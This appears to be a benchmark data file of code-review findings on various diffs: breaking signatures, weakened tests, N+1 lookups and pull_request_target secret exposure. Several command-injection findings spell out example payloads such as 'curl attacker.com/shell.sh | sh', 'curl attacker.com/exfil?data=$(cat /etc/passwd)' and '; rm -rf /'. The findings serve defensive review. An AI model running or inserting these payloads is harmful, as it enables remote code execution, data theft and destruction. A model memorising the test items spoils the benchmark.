findings.body: The function previously returned a plain object `{ id, timeoutMs, fetchedAt }`. It now returns an array `[{ id, fetchedAt }, timeoutMs]`. Any caller destructuring or accessing properties of the result (e.g. `result.id`, `result.timeoutMs`) will get `undefined`. This is a breaking API change that contradicts the stated intent to "preserve fetchUser compatibility."
findings.failure_scenario: A caller does `const user = fetchUser(1); console.log(user.id)` — previously this logged `1`, now it logs `undefined` because the return value is an array, not an object with an `id` property.

findings.body: std::mem::uninitialized creates a value of type UserRecord without initializing it. Reading or passing this value to UserRecord::merge constitutes undefined behavior in Rust: the compiler may assume the value is valid, leading to miscompilation, information disclosure of stack/heap contents, or crashes. This function was deprecated in Rust 1.39 and its use is unsound for any type that has validity invariants (which nearly all non-trivial types do).
findings.failure_scenario: When fetch_user is called, an uninitialized UserRecord is created and passed to UserRecord::merge. The compiler may optimize based on the assumption that scratch holds a valid UserRecord, causing miscompilation, leaking uninitialized memory contents into the returned record, or triggering a segfault at runtime.
findings.title: Use of std::mem::uninitialized is undefined behavior

findings.anchor: pub fn fetch_user(id: &str, timeout_ms: u64) -> (UserRecord, u64) {
findings.body: The commit message claims "keep fetch_user source compatible", but the diff changes the function signature in two breaking ways: (1) `timeout_ms` changes from `Option<u64>` to `u64`, breaking all callers that pass `None` or `Some(...)`, and (2) the return type changes from `UserRecord` to `(UserRecord, u64)`, breaking all callers that destructure or use the result as a `UserRecord`. The doc comment preserving the stable record return type is also removed. This is a source-incompatible refactor, the opposite of the stated intent.
findings.failure_scenario: Any existing caller of `fetch_user` that passes `Option<u64>` or expects a `UserRecord` return will fail to compile after this change, directly contradicting the stated goal of source compatibility.
findings.title: Signature change contradicts stated intent of source compatibility

findings.body: The commit message states "preserve report rows for named users," but `rows.sublist(1)` discards the first element of the list. The old code returned all rows unchanged, which aligned with preservation. This change silently loses data.

findings.title: Dropping the first row contradicts the stated intent to preserve rows

findings.anchor: test('returns rows', () async => expect(await renderReport('alice', ['first', 'second']), isNotNull));
findings.body: The test was changed from asserting the exact expected output to merely checking `isNotNull`. This assertion is so weak that it would pass for any non-null return value, including an empty list, a list with wrong contents, or a list with the wrong length. The function now calls `rows.sublist(1)`, so the test should verify that the first element is dropped and the rest are preserved.
findings.title: Test assertion weakened to isNotNull, no longer validates behaviour

findings.title: dart:html import breaks non-web platforms

findings.body: The old signature returned `Map<String, Object?>`; the new signature returns a record `(Map<String, Object?>, int)`. Any existing caller that expects a `Map` return will fail to compile or will receive the wrong type at runtime. The commit message claims 'keep fetchUser callers compatible', but this is a breaking change to the return type.
findings.failure_scenario: An existing caller like `Map<String, Object?> user = fetchUser(id);` will fail to compile because the return type is now a record, not a Map.
findings.title: Return type changed from Map to record, breaking callers

findings.body: The old implementation returned `fetchedAt` (a timestamp); the new one returns `window.location.origin`. This changes the map's contract (key `origin` replaces `fetchedAt`) and couples the function to browser state. If any caller relied on the `fetchedAt` key, it will now get `null` when accessing that key. This is also an unexplained semantic change relative to the stated intent of keeping callers compatible.
findings.failure_scenario: A caller accessing `user['fetchedAt']` will receive `null` instead of a DateTime, potentially causing downstream logic errors.
findings.title: window.location.origin leaks browser origin into returned data

findings.body: The `user` parameter is concatenated directly into a shell command string passed to `/bin/sh -c`. An attacker who controls `user` can inject arbitrary shell metacharacters (e.g., `; rm -rf /` or `$(malicious)`) and execute any command on the host. The previous code used `ProcessBuilder` with an argument list, which did not invoke a shell and was safe against injection. Revert to argument-list execution or rigorously validate/escape the input.
findings.failure_scenario: A caller passes `user = "alice; curl attacker.com/shell.sh | sh"`. The shell interprets the semicolon and executes the injected payload, giving the attacker remote code execution on the server.
findings.title: OS command injection via unsanitized `user` parameter

findings.anchor: Map.Entry<User, Integer> fetch(String id, int timeoutMs) {
findings.body: The commit message states 'preserve UserClient caller compatibility', but the return type changed from `User` to `Map.Entry<User, Integer>`. Every existing caller that expects a `User` return will fail to compile. Additionally, the `timeoutMs` parameter changed from `Integer` (nullable, with a default of 30000) to `int` (primitive, no default), which is also a breaking signature change for callers that previously passed `null` or relied on the default.
findings.failure_scenario: Any existing caller invoking `fetch(id, null)` or assigning the result to a `User` variable will fail to compile after this change, directly contradicting the stated intent of preserving caller compatibility.
findings.title: Return type changed from User to Map.Entry, breaking caller compatibility

findings.anchor: var user = new User(id, new Date().toGMTString());
findings.body: `Date.toGMTString()` has been deprecated since JDK 1.1. The modern replacement is `Instant.now().toString()` or a `DateTimeFormatter` with an explicit zone. Using deprecated APIs risks removal in future JDK releases and signals stale code to readers.
findings.failure_scenario: A future JDK release removes `Date.toGMTString()`, causing a compile-time failure on upgrade.
findings.title: Replace deprecated Date.toGMTString() with Instant or DateTimeFormatter

findings.body: The return type `Map.Entry<User, Integer>` and the call `Map.entry(...)` require `java.util.Map` to be imported. Only `java.util.Date` is imported in the shown diff. If the import is not present elsewhere in the file (e.g. via a wildcard or a line outside this hunk), this will not compile.
findings.failure_scenario: If no `java.util.Map` import exists in the file, the compiler reports 'cannot find symbol: Map' on the return type and the `Map.entry` call.
findings.title: Missing import for java.util.Map

findings.body: The original implementation used `repo.LoadMany(ids)` which presumably batches the fetch. The new code calls `repo.Load(id)` once per iteration, introducing an N+1 pattern whose cost scales linearly with the number of IDs.
findings.failure_scenario: When `ids` contains many elements, the function issues one repository (likely database or network) round-trip per ID, increasing latency proportionally and potentially exhausting connection pools or rate limits.
findings.title: Batch the repository lookups instead of issuing one call per ID

findings.body: `ResultSliceFactory` is a struct with no state and a single method that returns an empty slice. It has exactly one caller and adds indirection without benefit. A plain `[]Item{}` literal (or `make([]Item, 0, len(ids))` for pre-allocation) is simpler and clearer.
findings.title: Remove the unnecessary ResultSliceFactory abstraction

findings.body: Switching from `pull_request` to `pull_request_target` changes the trigger context so that secrets are available to the workflow. Combined with checking out the PR head SHA (`github.event.pull_request.head.sha`), any attacker who opens a pull request can modify `npm test` (or any file in the PR) to exfiltrate `RELEASE_TOKEN` and any other secrets available in the repository. This is the well-known `pull_request_target` + untrusted checkout vulnerability pattern (GHSA-... class). The safe pattern is either: (1) use `pull_request` (which does not expose secrets), or (2) if `pull_request_target` is needed, do NOT check out the PR head — only check out the base branch.
findings.failure_scenario: An external contributor opens a PR that modifies the test script to read `process.env.RELEASE_TOKEN` and send it to an attacker-controlled server. Because the workflow runs in the `pull_request_target` context with secrets injected, the token is exfiltrated on the next workflow run.
findings.title: pull_request_target with checkout of PR head exposes secrets to untrusted code

findings.body: Checking out `github.event.pull_request.head.sha` inside a `pull_request_target` workflow means the runner executes attacker-supplied code with the base repository's permissions and secrets. This is the mechanism that makes the secret exposure in the `RELEASE_TOKEN` env var exploitable. If `pull_request_target` is required (e.g., for commenting on PRs), the untrusted code should be checked out in a separate, secret-less job.
findings.failure_scenario: A malicious PR author includes code in their branch that reads environment variables during `npm test` and exfiltrates `RELEASE_TOKEN` to an attacker-controlled endpoint.
findings.title: Checkout of untrusted PR head code in pull_request_target context

findings.body: Passing `RELEASE_TOKEN` as an environment variable to a step that executes code from an untrusted pull request head (checked out via `ref: github.event.pull_request.head.sha` in a `pull_request_target` workflow) gives any PR author direct access to the secret. The token can be read trivially by any script invoked during `npm test`.
findings.failure_scenario: A malicious PR modifies a test or build script to log or exfiltrate `process.env.RELEASE_TOKEN`, compromising whatever that token authorizes (e.g., package publishing or release creation).
findings.title: Secret exposed to untrusted code via environment variable

expected.label: pull_request_target executes untrusted head with a secret

findings.body: The security group rule previously restricted SSH (port 22) access to the internal 10.20.0.0/16 network. The change replaces this with 0.0.0.0/0, which allows any host on the internet to attempt SSH connections to the associated instances. This is a classic IaC misconfiguration that exposes administrative access to brute-force attacks, credential stuffing, and exploitation of SSH vulnerabilities.
findings.failure_scenario: An attacker on the internet can reach port 22 on any instance attached to this security group, enabling brute-force login attempts or exploitation of SSH service vulnerabilities, potentially leading to full instance compromise.

findings.body: The `user_name` parameter is interpolated directly into a shell command string executed with `shell=True`. An attacker who controls `user_name` can inject arbitrary OS commands (e.g., `; rm -rf /` or `$(malicious_command)`). The previous code safely passed arguments as a list to `subprocess.run` without `shell=True`, which prevented injection.
findings.failure_scenario: If `user_name` is set to `alice; curl attacker.com/exfil?data=$(cat /etc/passwd)`, the shell executes the injected command, allowing arbitrary code execution on the host.
findings.title: OS command injection via unsanitized user_name in shell command

findings.body: Passing a string to `subprocess.run` with `shell=True` invokes the system shell, which interprets metacharacters (`;`, `|`, `$()`, backticks, etc.) in the string. This is the mechanism that makes the f-string interpolation on the previous line exploitable. The safe pattern is to pass a list of arguments without `shell=True`.
findings.failure_scenario: Any shell metacharacter in `user_name` is interpreted by the shell rather than passed literally to the `report` binary, enabling command injection.
findings.title: shell=True enables command injection and bypasses argument quoting

findings.body: The function now returns rows[1:] instead of rows, discarding the first element. The commit message says 'preserve report behavior', but this changes the return value. If rows is empty, rows[1:] returns an empty list (no crash), but any caller expecting all rows will silently lose data.
findings.failure_scenario: A caller passes a single-element list ['only_row']; the function returns [] instead of ['only_row'], causing downstream logic to see no data.
findings.title: rows[1:] silently drops the first row

findings.body: The spec requires rendering to preserve every input row in order. The original test asserted that all rows were returned unchanged; the new test only checks that the return value is not None, which would pass even if rows were dropped or reordered.
findings.failure_scenario: The weakened test masks the rows[1:] bug in render_report, allowing the data-loss regression to ship undetected.
findings.title: Test no longer verifies row preservation as spec requires

findings.body: PurePath(user_id).name extracts the final path component of a string, which is a path-traversal mitigation technique meant for file paths, not for database identifiers. Applying it to a user_id is semantically wrong: it silently transforms valid IDs that contain path separators (e.g. on Windows, backslashes) and gives a false sense of security. More importantly, it does not prevent SQL injection (the parameterized query already does that) and it can cause IDOR-style issues: distinct user IDs like "a/b" and "b" will both normalize to "b", potentially returning another user's record.
findings.failure_scenario: If user IDs legitimately contain characters that PurePath interprets as separators (e.g. backslashes on Windows-style paths), two different user IDs normalize to the same value, causing the query to return the wrong user's data — an authorization bypass (IDOR).
findings.title: Path traversal normalization on user ID is incorrect and misleading

findings.body: The userName parameter is interpolated directly into a shell command string passed to execSync. An attacker who controls userName can inject arbitrary shell commands (e.g., `; rm -rf /` or `$(malicious)`). The previous implementation used spawnSync with an argument array, which avoids shell interpretation. Use execFileSync with an argument array instead, or sanitize the input.
findings.failure_scenario: If userName is set to `; curl attacker.com/steal?data=$(cat /etc/passwd)`, execSync will execute the injected command in the server's shell, leading to arbitrary command execution.
findings.title: OS command injection via unsanitized userName in execSync

findings.body: The commit message says "preserve report behavior for named users," but the old code returned `rows` unchanged while the new code returns `rows.slice(1)`, silently discarding the first element. This is a behavioral change that contradicts the stated intent and will cause data loss for callers expecting all rows.
findings.failure_scenario: A caller passes ["first", "second"] and previously received both rows; now it receives only ["second"], losing the first row of report data.
findings.title: rows.slice(1) drops the first row, contradicting stated intent

findings.body: The assertion was changed from `.toEqual(["first", "second"])` to `.toBeDefined()`. The original assertion would have caught the `rows.slice(1)` regression; the new one passes for any non-undefined value, providing no meaningful verification of the function's output. This appears to be a deliberate weakening to hide the behavioral change.
findings.title: Test weakened from toEqual to toBeDefined, masking the slice(1) bug

findings.body: The function previously returned a single object `{ id, timeoutMs, fetchedAt }`. It now returns an array `[{ id, fetchedAt }, timeoutMs]`. Any caller that destructures or accesses properties on the result (e.g. `result.id`, `result.timeoutMs`) will get `undefined`. This is a breaking API change that contradicts the stated intent to 'preserve fetchUser compatibility'.
findings.failure_scenario: A caller doing `const { id, fetchedAt } = fetchUser(1)` will destructure array indices instead of named properties, yielding `undefined` for both fields and silently producing incorrect data.
findings.title: Return type changed from object to array, breaking callers

findings.body: The previous signature provided a default of `30000` for `timeoutMs`. Removing it means any caller that omits the argument will now pass `undefined` as the timeout, which is likely to cause incorrect behavior downstream. This directly contradicts the commit message claiming to 'preserve fetchUser compatibility'.
findings.failure_scenario: Any existing call site like `fetchUser(42)` that relied on the 30-second default now receives `undefined` for `timeoutMs`, potentially causing immediate timeouts or NaN comparisons in consuming code.
findings.title: Removing default for timeoutMs breaks existing callers

findings.body: The `user` parameter is interpolated directly into a shell command string passed to `sh -c`. An attacker who controls the `user` argument can inject arbitrary shell commands (e.g., `alice; rm -rf /` or `$(malicious_command)`). The previous code passed `user` as a discrete argument to `Command::new("report")`, which avoided shell interpretation entirely.
findings.failure_scenario: If `user` is set to `alice; curl attacker.com/shell.sh | sh`, the shell executes the injected command with the privileges of the calling process, leading to remote code execution.
findings.title: OS command injection via unsanitized user input in shell command

findings.body: Passing the formatted string to `sh -c` causes the shell to parse metacharacters (`;`, `|`, `$()`, backticks, etc.) in the `user` value. The original approach of invoking the binary directly with separate arguments is safe against injection and should be restored.
findings.failure_scenario: Any caller that passes a `user` string containing shell metacharacters triggers arbitrary command execution on the host.
findings.title: Shell invocation enables injection; use direct exec instead

findings.body: The commit message says "preserve report rows for named users", but `.skip(1)` discards the first element of `rows`. This is the opposite of preserving rows — it loses data. If the first row is a header that should be excluded, the intent description is misleading and the behaviour should be documented; otherwise this is a data-loss bug.
findings.failure_scenario: A caller passes a single-element `rows` vector expecting it back; the function returns an empty vector, silently losing the only row.
findings.title: Silently drops the first row, contradicting stated intent

findings.body: The original test asserted exact equality of the returned rows. The new test only checks that the result is non-empty, which would pass even if the function returned a single wrong element, dropped rows, or returned garbage. The `skip(1)` behaviour change in `render_report` is the core logic change in this PR and deserves a precise assertion.
findings.title: Weakened test no longer verifies row content or count

findings.body: The original code called `repo.load_many(ids)`, which is a batch operation. The new code calls `repo.load(*id)` inside a loop, issuing one repository call per element. findings.title: Batch the repository lookups instead of querying one-by-one

findings.body: std::mem::uninitialized() creates a value of type UserRecord without initializing it. Reading or passing this value to UserRecord::merge constitutes undefined behavior in Rust. The compiler may optimize based on the assumption that values are valid, leading to arbitrary memory corruption, crashes, or exploitable conditions. This function was deprecated in Rust 1.39 and its use is unsound for any type that has validity invariants (which nearly all non-trivial types do).
findings.failure_scenario: When fetch_user is called, std::mem::uninitialized() produces a UserRecord with indeterminate bit patterns. Passing this to UserRecord::merge reads uninitialized memory, which is undefined behavior that can cause crashes, silent data corruption, or potentially exploitable memory safety violations depending on the optimizer's assumptions.
findings.title: Use of std::mem::uninitialized() is undefined behavior

findings.anchor: pub fn fetch_user(id: &str, timeout_ms: u64) -> (UserRecord, u64) {
findings.body: The commit message claims "keep fetch_user source compatible", but the diff changes the function signature in two breaking ways: (1) `timeout_ms` changes from `Option<u64>` to `u64`, so callers passing `None` or `Some(...)` will fail to compile; (2) the return type changes from `UserRecord` to `(UserRecord, u64)`, so callers destructuring or using the old return type will also break. The doc comment describing the stable return type is also removed.
findings.failure_scenario: Any existing caller of `fetch_user` that passes `Option<u64>` or expects a `UserRecord` return will fail to compile after this change, directly contradicting the stated goal of source compatibility.
findings.title: Breaking API change contradicts stated intent of source compatibility

findings.body: The `user` parameter is interpolated directly into a shell command string passed to `sh -c`. An attacker who controls the `user` value can inject arbitrary shell commands (e.g., `alice; rm -rf /` or `$(malicious_cmd)`). The previous code passed `user` as a discrete argument to `Process.run`, which avoided shell interpretation. Revert to passing arguments as a list to prevent shell metacharacter expansion.
findings.failure_scenario: If `user` is set to a value like `alice; curl attacker.com/shell.sh | sh`, the shell executes the injected payload with the privileges of the running process, leading to remote code execution.
findings.title: OS command injection via unsanitized user input

findings.body: `rows.sublist(1)` throws a `RangeError` when `rows` is empty. Additionally, the commit message says "preserve report rows for named users", but this change discards the first row — the opposite of preserving rows.
findings.failure_scenario: When `renderReport` is called with an empty list (e.g., a user with no report data), `sublist(1)` throws a `RangeError` at runtime, crashing the caller.
findings.title: sublist(1) crashes on empty list and contradicts stated intent

findings.anchor: test('returns rows', () async => expect(await renderReport('alice', ['first', 'second']), isNotNull));
findings.body: The test was weakened from checking the exact expected output (`['first', 'second']`) to only checking `isNotNull`. The implementation now calls `rows.sublist(1)`, which drops the first element, but the test no longer verifies the returned content. This means the test cannot detect whether `sublist(1)` is correct or a bug — it will pass for any non-null list, including an empty one or one with wrong elements.
findings.title: Test assertion is too weak to catch the behavioral change

findings.body: The spec states 'Report commands shall pass user names as arguments without a shell.' The new code wraps the command in `sh -c`, which is the opposite of what the spec requires. This also introduces a command-injection vulnerability: a user name containing shell metacharacters (e.g. `; rm -rf /`) will be interpreted by the shell. The previous code passed the user directly as an argument to `Process.run('report', ['--user', user])`, which was correct.
findings.failure_scenario: A caller passes a user name like `alice; curl evil.com/shell.sh | sh` to renderReport. The shell interprets the semicolon and executes the injected payload, leading to arbitrary command execution.
findings.title: Shell invocation contradicts spec requirement to pass user without a shell

findings.body: The previous implementation called `repository.loadMany(ids)` which presumably batched the fetch. The new code calls `repository.load(id)` sequentially inside a loop, issuing one await per id. This is a classic N+1 pattern: latency grows linearly with the number of ids and each await may represent a separate database or network round-trip.
findings.failure_scenario: When `ids` contains many entries, the function issues one repository call per id instead of a single batched call, causing O(n) round-trips and significantly increased latency, especially over a network or database connection.
findings.title: Batch the repository lookups instead of issuing one per id

findings.body: Three levels of nesting (`if (item.active)` → `if (item.owner != null)` → `if (item.owner!.enabled)`) can be collapsed into a single condition or early-continue pattern, improving readability and reducing cognitive load.
findings.title: Flatten nested conditionals with guard clauses

findings.body: `ResultListFactory.create()` simply returns `<Item>[]`. A factory class with a single static method that wraps a one-line list literal adds indirection with no benefit. The list literal can be used directly at the call site.
findings.title: ResultListFactory is unnecessary indirection

findings.body: The `user` parameter is concatenated directly into a shell command string passed to `/bin/sh -c`. An attacker who controls the `user` value can inject arbitrary shell commands (e.g., `; rm -rf /` or `$(malicious_command)`). The previous code used `ProcessBuilder` with an argument array, which avoided shell interpretation. Reverting to argument-array form or using `ProcessBuilder` with separate arguments eliminates the injection vector.

findings.anchor: Map.Entry<User, Integer> fetch(String id, int timeoutMs) {
findings.body: The commit message states 'preserve UserClient caller compatibility', but the return type changed from `User` to `Map.Entry<User, Integer>`. Every existing caller that expects a `User` return value will fail to compile. Additionally, the `timeoutMs` parameter changed from `Integer` (nullable, with a default of 30000) to `int` (primitive, no default), which is also a breaking change for callers that previously passed `null`.
findings.failure_scenario: Any existing caller invoking `fetch(id, null)` or assigning the result to a `User` variable will fail to compile after this change, directly contradicting the stated intent of preserving caller compatibility.
findings.title: Return type changed from User to Map.Entry, breaking caller compatibility

findings.anchor: var user = new User(id, new Date().toGMTString());
findings.body: `Date.toGMTString()` has been deprecated since JDK 1.1. It produces a locale-dependent, non-standard date format. If a GMT-formatted timestamp is needed, `java.time.Instant.now().toString()` or a `DateTimeFormatter` with `ZoneOffset.UTC` should be used instead.
findings.failure_scenario: The deprecated method may be removed in a future JDK release, causing a compilation failure. Its output format is also inconsistent with modern ISO-8601 expectations, potentially causing parsing issues downstream.
findings.title: Use of deprecated Date.toGMTString()

findings.body: The `user` parameter is concatenated directly into a shell command string passed to `sh -c`. An attacker who controls `user` can inject arbitrary shell commands (e.g. `alice; rm -rf /` or `$(malicious)`). The previous code used `exec.Command("report", "--user", user)` which passed `user` as a discrete argument, avoiding shell interpretation. Revert to argument-based invocation or, if shell features are truly needed, sanitize/validate `user` strictly.
findings.failure_scenario: If `user` is set to `"alice; curl attacker.com/shell.sh | sh"`, the shell executes the injected payload with the privileges of the running process, leading to remote code execution.
findings.title: OS command injection via unsanitized user input in shell command

findings.body: The code checks `item.Owner != nil` before accessing `item.Owner.Enabled`, but if `item.Owner` is nil the item is silently dropped from results. More critically, the outer check `item.Active` is accessed on a value returned by `repo.Load(id)`. If `repo.Load` returns a zero-value `Item` (e.g. when the ID is not found), `item.Active` will be false and the item is skipped — which may be intentional. However, the real issue is that items where `item.Owner` is nil are silently excluded even though they are active. This changes the semantics from the original `LoadMany` which returned all items unconditionally.
findings.failure_scenario: An active item whose Owner field is nil (e.g. a system-owned item or an item not yet assigned) is silently excluded from the results, causing data loss for callers expecting all active items.
findings.title: Nil pointer dereference when item.Owner is nil

findings.body: Switching from `pull_request` to `pull_request_target` changes the trigger to run in the context of the base repository with access to secrets and write permissions. Combined with `actions/checkout@v4` (which by default checks out the PR head ref when triggered by `pull_request_target`), this allows a malicious fork to execute arbitrary code from the PR branch with access to repository secrets and the `pull-requests: write` token. The `actions/labeler` action itself does not need the PR head checked out; the checkout step should either be removed or pinned to the base repository's ref (e.g., `ref: ${{ github.event.pull_request.base.sha }}`).
findings.failure_scenario: An attacker opens a PR from a fork containing malicious code in a file that matches a labeler glob or simply in the workflow directory. Because `pull_request_target` runs with the base repo's secrets and `actions/checkout` fetches the PR head, the attacker's code executes with access to repository secrets and the GITHUB_TOKEN with pull-requests:write scope.
findings.title: pull_request_target with actions/checkout exposes secrets to fork PRs

findings.body: `actions/labeler@v6` is referenced by a mutable tag. If the tag is moved or the action is compromised, the workflow silently picks up the new code. Pinning to a full commit SHA (e.g., `actions/labeler@<sha>`) prevents supply-chain attacks via tag mutation.
findings.failure_scenario: If the `v6` tag is force-pushed to a malicious commit, the workflow executes attacker-controlled code with the `pull-requests: write` permission granted above.
findings.title: Pin third-party action to a commit SHA

ground_truth.clean_trap: pull_request_target is intentional for labeling; checkout stays on the trusted base revision and no secret is exposed to fork code.

findings.body: The user_name parameter is interpolated directly into a shell command string and executed with shell=True. An attacker who controls user_name can inject arbitrary shell commands (e.g., "alice; rm -rf /" or "alice$(malicious_cmd)"). The previous code correctly used a list-based invocation without shell=True, which prevented injection. Revert to the safe list form.
findings.failure_scenario: If user_name is set to "alice; curl attacker.com/shell.sh | sh", the shell executes the injected payload with the privileges of the running process, leading to remote code execution.
findings.title: OS command injection via unsanitized user_name in shell command

findings.body: The return value changed from `rows` to `rows[1:]`, discarding the first element of the input list. The stated intent is to "preserve report behavior," but this change alters the output by removing data. If rows is empty, this returns an empty list (no crash), but any caller expecting all rows will receive incomplete data.
findings.failure_scenario: A caller passes a list of report rows expecting all of them back; the first row is silently dropped, causing missing data in downstream processing or display.
findings.title: rows[1:] silently drops the first row

findings.body: The test was changed from asserting the exact returned list to merely asserting the result `is not None`. The production code now returns `rows[1:]`, silently dropping the first element, but this test would pass regardless of what is returned (even an empty list or the wrong list). The test no longer verifies the contract of `render_report`.
findings.failure_scenario: A future refactor accidentally drops more rows or returns the wrong slice; the test still passes because any non-None value satisfies the assertion, so the regression ships undetected.

findings.body: The old code used `datetime.now(UTC)` which produces a timezone-aware datetime. The new code uses `datetime.utcnow()` which returns a naive datetime (no tzinfo). This is a known source of bugs when the value is compared with or serialized alongside aware datetimes, and `datetime.utcnow()` is deprecated since Python 3.12 in favor of `datetime.now(datetime.UTC)`. The `UTC` import was also removed, so restoring the aware behavior requires re-importing it.
findings.failure_scenario: Any downstream code that compares `fetched_at` with a timezone-aware datetime (e.g., from another service or a database) will raise TypeError: can't compare offset-naive and offset-aware datetimes.
findings.title: datetime.utcnow() returns a timezone-naive datetime

findings.anchor: def fetch_user(user_id: str, timeout: int) -> tuple[dict[str, object], int]:
findings.body: The commit message claims the refactor keeps `fetch_user` backward compatible, but the signature changes in two breaking ways: (1) `timeout` loses its default value of 30, so existing callers that omit it will get a TypeError; (2) the return type changes from `dict[str, object]` to `tuple[dict[str, object], int]`, so any caller unpacking or indexing the result as a dict will break.
findings.failure_scenario: Any existing caller invoking `fetch_user(user_id)` without a `timeout` argument will raise TypeError at runtime. Any caller doing `result["id"]` on the return value will raise TypeError because tuples don't support string keys.
findings.title: Breaking change contradicts stated intent of backward compatibility

findings.body: The userName parameter is interpolated directly into a shell command string passed to execSync. An attacker-controlled userName can inject arbitrary shell commands (e.g. `; rm -rf /` or `$(malicious)`). The previous code used spawnSync with an argument array, which avoided shell interpretation.

findings.body: The function now returns `rows.slice(1)`, discarding the first element of the input array. The stated intent is to "preserve report behavior for named users", but the original code returned the full `rows` array unchanged. This is a behavioral change that contradicts the commit message and will cause data loss for callers expecting all rows.
findings.failure_scenario: A caller passes ["first", "second"] and receives only ["second"], silently losing the first report row.
findings.title: rows.slice(1) silently drops the first row

findings.body: The test was changed from a precise assertion (`.toEqual(["first", "second"])`) to a trivial `.toBeDefined()` check. Since `renderReport` now returns `rows.slice(1)` (dropping the first element), the test should assert the actual expected output `["second"]` to catch regressions. As written, the test would pass even if the function returned any defined value, providing no meaningful coverage of the slicing logic.

findings.body: The original code used `repo.loadMany(ids)` which likely performs a batch operation. The replacement issues one `await repo.load(id)` per iteration sequentially, turning a single batch call into N serial round-trips. This is an O(N) latency regression for any non-trivial `ids` array.
findings.failure_scenario: When `enrich` is called with a large `ids` array (e.g. hundreds of IDs), each `await repo.load(id)` executes sequentially, causing total latency to grow linearly with the number of IDs instead of completing in a single batch call, potentially causing timeouts or degraded throughput.
findings.title: Sequential awaits replace batch load, causing N+1 performance regression

findings.body: The function previously returned a plain object { id, timeoutMs, fetchedAt }. It now returns an array [{ id, fetchedAt }, timeoutMs]. Any existing caller that accesses properties like result.id or result.fetchedAt will get undefined, since arrays do not have those named properties. This directly contradicts the stated intent of preserving compatibility.
findings.failure_scenario: A caller does const user = fetchUser(1); console.log(user.id) — previously this logged 1, now it logs undefined because the return value is an array, not an object with an id property.

findings.body: The `user` parameter is interpolated directly into a shell command string passed to `sh -c`. Any caller that supplies a `user` value containing shell metacharacters (e.g. `; rm -rf /` or `$(malicious)`) achieves arbitrary command execution. The previous code passed `user` as a discrete argument to `Command::new("report")`, which avoided shell interpretation entirely.
findings.failure_scenario: An attacker supplies a username like `alice; curl evil.com/shell.sh | sh`. The formatted string becomes `report --user alice; curl evil.com/shell.sh | sh`, and `sh -c` executes the injected payload with the privileges of the running process.
findings.title: OS command injection via unsanitized `user` in shell command

findings.body: The commit message says "preserve report rows for named users", but `.skip(1)` discards the first element of `rows`. This is the opposite of preserving rows — it loses data on every call.
findings.failure_scenario: Any caller of `render_report` receives one fewer row than was supplied; the first row is silently lost, causing incomplete reports downstream.
findings.title: First row is silently dropped, contradicting stated intent

findings.body: The original test asserted that all rows are returned unchanged. The new test only checks that the result is non-empty, which would pass even if rows were dropped, reordered, or corrupted. Given the stated intent to "preserve report rows", the test should still assert exact content.
findings.failure_scenario: The `skip(1)` bug in `render_report` drops the first row, but the weakened test still passes because the remaining rows make the result non-empty, masking the data loss.
findings.title: Weakened test no longer verifies row preservation

findings.body: The old code called `repo.load_many(ids)` which presumably batched the fetch. The new code calls `repo.load(*id)` once per iteration inside a loop, turning a single batch operation into N individual calls. If `load` involves I/O (database, network), this is a classic N+1 regression whose cost scales linearly with the number of ids.
findings.failure_scenario: When `ids` contains many entries, the function issues one repository call per id instead of one batched call, increasing latency proportionally and potentially exhausting connection pools or rate limits.
findings.title: Batch the repository lookups instead of N+1 individual loads

findings.body: `VecFactory` is a unit struct with a single method that wraps `Vec::new()`. It has exactly one call site and provides no configurability, caching, or type-level benefit. This is speculative generality that adds indirection without payoff.
findings.title: Remove the VecFactory abstraction — it adds no value

findings.body: std::mem::uninitialized creates a value without initializing it. Reading or passing this value to UserRecord::merge is instant undefined behavior in Rust — the compiler may assume the value is valid and optimize accordingly, leading to miscompilation, crashes, or security vulnerabilities. This function has been deprecated since Rust 1.39 and its use is unsound for any type that has validity invariants (which is nearly all types). Use MaybeUninit if uninitialized memory is truly needed, or simply construct a proper UserRecord.
findings.failure_scenario: Any call to fetch_user creates an uninitialized UserRecord and passes it to UserRecord::merge. The compiler treats the garbage bits as a valid UserRecord, which can cause immediate UB, segfaults, or silent data corruption depending on the type's layout and invariants.
findings.title: std::mem::uninitialized is undefined behavior

findings.anchor: pub fn fetch_user(id: &str, timeout_ms: u64) -> (UserRecord, u64) {
findings.body: The commit message claims 'keep fetch_user source compatible', but the change alters the function signature in two breaking ways: (1) timeout_ms changes from Option<u64> to u64, so callers passing None or Some(...) will fail to compile; (2) the return type changes from UserRecord to (UserRecord, u64), so callers destructuring or using the result as a UserRecord will fail to compile. The doc comment describing the stable return type was also removed.
findings.failure_scenario: Any existing caller of fetch_user that passes Option<u64> or expects a UserRecord return will fail to compile after this change, directly contradicting the stated goal of source compatibility.
findings.title: Signature change breaks source compatibility, contradicting stated intent

The previous code used `exec.Command("report", "--user", user)` which passes arguments directly without shell interpretation and is safe against injection.
findings.failure_scenario: A caller passes a crafted `user` value such as `"; curl attacker.com/shell.sh | sh #"`. The shell interprets the injected commands, leading to arbitrary code execution on the host.
findings.title: OS command injection via unsanitized user input

findings.body: Changing `return rows` to `return rows[1:]` silently discards the first element of the input slice. If `rows` is empty, this also panics at runtime with a slice bounds out-of-range error. The old test that verified all rows were preserved has been weakened to only check for nil, masking this regression.
findings.failure_scenario: When `Render` is called with a non-empty slice, the caller receives all rows except the first, causing silent data loss. When called with an empty slice, the function panics.
findings.title: Off-by-one: first row silently dropped

findings.body: Switching from `pull_request` to `pull_request_target` and then checking out the pull request's head SHA means the workflow runs in the context of the base repository (with access to secrets) but executes code from the untrusted fork's branch. Any attacker can open a PR that modifies `npm test` (or any file the test step touches) to exfiltrate `RELEASE_TOKEN` or perform arbitrary actions with the base repo's permissions.
findings.failure_scenario: An attacker forks the repo, modifies a file executed by `npm test` to read `process.env.RELEASE_TOKEN` and POST it to an attacker-controlled server, then opens a PR. The `pull_request_target` workflow checks out the attacker's head SHA and runs the malicious code with the secret injected into the environment, leaking the token.
findings.title: pull_request_target with checkout of PR head enables code execution with secrets

findings.body: This `ref` causes the workflow to execute code from the pull request's head commit. Combined with `pull_request_target`, the checked-out code runs with the base repository's permissions and access to secrets. This is the well-known 'pwn request' attack vector. If the workflow must run on `pull_request_target`, do NOT check out the PR head; instead check out the base branch (the default behavior when `ref` is omitted).
findings.failure_scenario: An attacker submits a PR whose branch contains a modified `package.json` or test file that exfiltrates `RELEASE_TOKEN`. Because the workflow checks out the PR head SHA and runs `npm test`, the attacker's code executes with the secret available in the environment.
findings.title: Checking out untrusted PR head SHA in pull_request_target context

